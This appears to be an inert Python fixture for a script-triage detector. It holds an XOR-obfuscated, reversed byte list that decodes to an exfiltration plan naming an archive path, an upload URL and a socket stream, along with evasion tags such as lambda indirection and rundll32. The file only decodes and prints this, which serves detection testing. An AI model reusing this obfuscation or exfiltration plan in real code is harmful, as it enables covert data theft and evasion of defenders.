#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_c5ab7e9c = [69, 5, 149, 125, 24, 13, 95, 142, 97, 73, 81, 8, 140, 96, 84, 80, 4, 140, 50, 26, 26, 14, 142, 31, 10, 70, 9, 157, 39, 23, 64, 36, 192, 50, 13, 84, 40, 130, 50, 11, 82, 3, 157, 3, 86, 15, 47, 210, 59, 13, 84, 28, 176, 54, 15, 92, 4, 140, 33, 24, 73, 8, 142, 60, 21, 69, 25, 192, 55, 16, 89, 13, 153, 61, 16, 27, 9, 131, 35, 20, 84, 20, 138, 125, 24, 13, 95, 142, 97, 73, 81, 8, 140, 96, 86, 26, 86, 156, 35, 13, 65, 4, 210, 63, 11, 64, 51, 139, 50, 22, 89, 28, 154, 47, 24, 13, 95, 142, 97, 73, 81, 8, 140, 96, 84, 91, 11, 134, 50, 9, 88, 13, 140, 110, 29, 92, 51, 129, 52, 16, 84, 28, 130, 50, 26, 73, 30, 128, 32, 10, 80, 15, 138, 55, 28, 71, 28, 176, 97, 74, 89, 0, 139, 61, 12, 71, 81, 129, 58, 24, 93, 15, 176, 32, 14, 90, 8, 129, 58, 14, 73, 30, 134, 55, 28, 91, 3, 176, 33, 28, 89, 0, 142, 39, 10, 91, 5, 150, 35, 68, 71, 9, 134, 33, 11, 84, 15, 147, 61, 22, 92, 24, 140, 54, 11, 92, 8, 129, 58, 38, 84, 8, 141, 62, 24, 89, 81, 129, 60, 16, 65, 13, 140, 32, 12, 83, 14, 128, 47, 17, 86, 24, 142, 35, 10, 92, 8, 176, 42, 11, 84, 2, 128, 58, 13, 86, 5, 139, 110, 1, 84, 24, 129, 42, 10, 73, 93, 210, 39, 23, 64, 3, 140, 12, 28, 82, 13, 155, 32, 5, 91, 13, 131, 35, 38, 88, 13, 138, 33, 13, 70, 51, 155, 54, 18, 86, 3, 156, 110, 11, 80, 24, 159, 50, 29, 84, 16, 138, 39, 22, 88, 9, 157, 12, 13, 92, 1, 156, 61, 24, 71, 24, 195, 54, 15, 92, 4, 140, 33, 24, 106, 9, 139, 60, 26, 91, 9, 195, 63, 24, 86, 3, 131, 12, 13, 86, 9, 131, 63, 22, 86, 81, 156, 35, 28, 65, 31, 147, 97, 68, 67]
    CODEC_c5ab7e9c = "reversed_integer_list|repeating_key_xor|35,79,53,ef,6c"

    def load_c5ab7e9c():
        return bytes(reversed(MATERIAL_c5ab7e9c))

    def decode_c5ab7e9c(e):
        key_bytes = (53, 121, 83, 239, 108,)
        return bytes(value ^ key_bytes[index % len(key_bytes)] for index, value in enumerate(e))

    def recover_c5ab7e9c():
        n = ":".join(("north", "south"))
        for _pass in range(1):
            d = decode_c5ab7e9c(load_c5ab7e9c())
        t = d.decode("ascii", "strict")
        return t

    def inspect_c5ab7e9c():
        return recover_c5ab7e9c()

    def surface_c5ab7e9c():
        routes = {"selected": lambda: ("dictionary_dispatch", "lambda_indirection", "pyinstaller_onedir", "rundll32_predecessor")}
        return routes["selected"]()

    def obfuscation_c5ab7e9c():
        recover = lambda value: value
        return recover("lambda_indirection")

    def plan_c5ab7e9c():
        fields = dict(item.split("=", 1) for item in inspect_c5ab7e9c().split("|"))
        analysis_surface = surface_c5ab7e9c()
        obfuscation_surface = obfuscation_c5ab7e9c()
        operation_plan = ("socket_stream_plan", fields["archive_path"], fields["upload_url"])
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_c5ab7e9c())
